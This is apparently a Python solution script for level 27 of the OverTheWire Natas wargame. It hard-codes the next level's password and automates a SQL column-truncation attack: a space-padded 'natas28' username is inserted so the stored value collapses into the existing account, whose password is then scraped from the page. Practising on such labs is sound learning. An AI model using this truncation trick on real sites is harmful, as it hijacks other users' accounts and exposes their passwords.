import requests

import natas26
from helpers import between


def solution(password: str = None, cheat: bool = False) -> str:
    if cheat:
        return "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
    url = "http://natas27.natas.labs.overthewire.org"
    username = "natas27"
    if not password:
        password = natas26.solution(cheat=True)

    # From the source code:
    # function dumpData($link,$usr){
    #
    #     $user=mysql_real_escape_string($usr);
    #
    #     $query = "SELECT * from users where username='$user'";
    #     $res = mysql_query($query, $link);
    #     if($res) {
    #         if(mysql_num_rows($res) > 0) {
    #             while ($row = mysql_fetch_assoc($res)) {
    #                 // thanks to Gobo for reporting this bug!  
    #                 //return print_r($row);
    #                 return print_r($row,true);
    #             }
    #         }
    #     }
    #     return False;
    # }
    #
    # This displays the username and password when you log in, but it loops
    # through all query results when we should expect only one row.
    # If you try to log in with a username that is not in the database, it
    # inserts a row in the database. It is possible to insert a username that
    # exceeds the column size and also evaluates to the 'natas28' username
    # after the value gets truncated.

    auth = (username, password)
    natas28_username = "natas28"
    column_size = 64
    long_username = "{base}{spaces}x".format(
        base=natas28_username,
        spaces=" " * (column_size - len(natas28_username))
    )
    data = {"username": long_username, "password": "password"}
    s = requests.Session()
    s.post(url, auth=auth, data=data)
    data["username"] = natas28_username
    r = s.post(url, auth=auth, data=data)
    start = "[password] =&gt; "
    end = "\n)"
    natas28_password = between(r.text, start, end)
    return natas28_password
